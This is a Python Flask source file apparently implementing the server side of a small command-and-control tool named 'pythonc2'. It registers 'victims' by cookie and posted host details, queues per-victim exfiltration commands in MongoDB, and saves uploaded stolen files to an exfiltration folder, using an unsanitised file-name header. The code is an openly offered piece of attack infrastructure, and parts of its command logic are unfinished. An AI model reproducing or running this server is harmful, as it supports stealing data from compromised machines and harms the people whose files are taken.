from flask import Flask,request
from pathlib import Path
import  os
import pymongo
import logging
import pdb
import base64

def main(myclient):
	app = Flask('app')

	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False

	def get_victim_info(request):
		return request.form.to_dict()

	@app.route('/',methods = ['GET', 'POST'])
	def run():
		if request.method == 'GET':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			x = cmds.find_one()
			victim_id = get_cookie(request)


			if x:
				if 'sample' in x:
					cmds.delete_one(x)
					x = cmds.find_one()

				if 'command' in x and x['victim_id'] == victim_id:
					cmd = x['command']
					cmds.delete_one(x)
					return "Exfiltration command detected"



			return 'Nothing Fishy going on here :)'
		if request.method == 'POST':
			# data = request.json
			# import pdb
			# pdb.set_trace()

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			x = cmds.find_one()
			victim_id = get_cookie(request)
			victims = mydb['victims']
			info = get_victim_info(request)

		if victim_id:
			h = {'id':victim_id}
			h.update(info)

			if not victims.find_one(h):
				victims.insert_one(h)
				return ('Victim registered', 200)
			else:
				return ('Victim already registered', 302)

		return ('Bad request', 400)

	app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
	main(myclient)